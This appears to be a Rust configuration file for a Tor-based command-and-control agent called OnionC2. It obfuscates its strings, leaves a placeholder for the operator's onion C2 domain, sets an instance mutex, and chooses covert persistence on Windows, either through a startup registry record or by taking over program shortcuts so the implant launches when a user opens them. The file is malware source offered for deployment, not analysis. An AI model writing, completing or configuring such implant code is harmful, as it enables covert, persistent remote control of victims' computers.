use goldberg::{goldberg_string};

// Onion domain of your C2 server.
#[inline]
pub fn get_address() -> String {
    // Put your onion domain here!!!
    goldberg_string!("").to_string()
}

// Name of a file where an agent would keep its ID.
#[inline]
pub fn get_id_path() -> String {
    goldberg_string!("agent.id").to_string()
}

// Defines mutex name. Leave empty to disable the mutex.
// This mutex prevents multiple instances of an agent
// to run in parallel.
#[inline]
pub fn get_mutex_name() -> String {
    goldberg_string!("OnionC2AgentMutex").to_string()
}

// Enum representing available persistence techniques.
// Do not modify, except when coding a new technique.
// For configuration purposes modify the "persistence"
// function.
#[allow(dead_code)]
pub enum Persistence {
    // No persistence at all.
    None,

    // Creates a registry record in order to make the
    // system run an agent on startup.
    WindowsRegistry,

    // Modifies shortcuts of a program to point to an
    // agent in order to assure execution when a user
    // runs that shortcut. This would also run program
    // to which shortcut was initially pointing to.
    // Highly recommended to enable mutex utilization
    // when relying on this technique.
    ShortcutTakeover,
}

// Specifies which persistence technique to use.
#[inline]
pub fn persistence() -> Persistence {
    return Persistence::WindowsRegistry;
}

// Relates to Persistence::WinRegistryBased
// Specifies name of the registry record.
#[inline]
pub fn get_reg_program_name() -> String {
    goldberg_string!("Agent").to_string()
}